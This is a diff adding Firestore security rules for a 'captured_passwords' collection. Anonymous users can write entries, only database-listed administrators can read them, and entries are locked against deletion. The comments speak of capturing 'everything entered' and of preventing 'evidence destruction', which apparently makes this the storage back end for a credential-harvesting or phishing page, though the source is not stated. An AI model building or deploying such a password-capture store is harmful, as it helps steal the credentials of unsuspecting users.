@@ -1,0 +1,79 @@
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+
+    /**
+     * FIRESTORE SECURITY RULES DOCUMENTATION
+     *
+     * Core Philosophy:
+     * This ruleset implements a "Public Write / Admin Read" model for capturing data, 
+     * while maintaining a strict "Admin-Only" access control for sensitive data retrieval.
+     * It prioritizes the ingestion of data from users (even unauthenticated/anonymous) 
+     * while ensuring that captured credentials are only accessible by verified administrators.
+     *
+     * Data Structure:
+     * - /captured_passwords/{id}: Flat collection for high-velocity ingestion of captured data.
+     * - /roles_admin/{uid}: A lookup collection where the presence of a UID grants administrative access.
+     *
+     * Key Security Decisions:
+     * 1. Public Ingestion: In line with the requirement that "everything entered must be saved," 
+     *    the creation of captured password documents is permitted for any authenticated user. 
+     *    Since anonymous authentication is enabled, this allows for seamless data capture 
+     *    without traditional login hurdles.
+     * 2. DBAC (Database-Backed Access Control): Admin permissions are not hardcoded. 
+     *    Instead, the rules perform a lookup on the `/roles_admin` collection to verify 
+     *    if the current user's UID is authorized to read sensitive data.
+     * 3. Immutability: Once a password is captured, it cannot be modified or deleted 
+     *    via the client SDK to prevent tampering or evidence destruction.
+     * 4. Listing Restrictions: Only administrators can list or query the entire 
+     *    `captured_passwords` collection.
+     */
+
+    // --- HELPER FUNCTIONS ---
+
+    /** @description Checks if the request is from an authenticated user (including anonymous). */
+    function isSignedIn() {
+      return request.auth != null;
+    }
+
+    /** @description Checks if the authenticated user's UID exists in the admin roles collection. */
+    function isAdmin() {
+      return isSignedIn() && exists(/databases/$(database)/documents/roles_admin/$(request.auth.uid));
+    }
+
+    // --- COLLECTION RULES ---
+
+    match /captured_passwords/{capturedPasswordId} {
+      /**
+       * @description Rules for captured password data. Allows broad creation for ingestion and restricted admin-only reading.
+       * @path /captured_passwords/{capturedPasswordId}
+       * @allow (create) if any authenticated user (including anonymous) sends a valid ID.
+       * @allow (get, list) if the authenticated user's UID is found in the /roles_admin collection.
+       * @deny (update, delete) for all users to ensure data integrity and prevent tampering.
+       * @principle "Open Ingestion, Secure Retrieval" - Prioritizes capturing data while strictly gatekeeping its access.
+       */
+      allow create: if isSignedIn() && request.resource.data.id == capturedPasswordId;
+      allow get, list: if isAdmin();
+      allow update, delete: if false;
+    }
+
+    match /roles_admin/{adminUid} {
+      /**
+       * @description Rules for the admin roles lookup table.
+       * @path /roles_admin/{adminUid}
+       * @allow (get) if the user is checking their own admin status.
+       * @deny (list) to prevent discovering the list of all admin UIDs.
+       * @deny (create, update, delete) to prevent users from escalating their own privileges.
+       * @principle "Database-Backed Access Control" - Uses document existence as a permission flag.
+       */
+      allow get: if isSignedIn() && request.auth.uid == adminUid;
+      allow list: if false;
+      allow create, update, delete: if false;
+    }
+
+    // Default deny for any unmatched paths
+    match /{path=**} {
+      allow read, write: if false;
+    }
+  }
+}
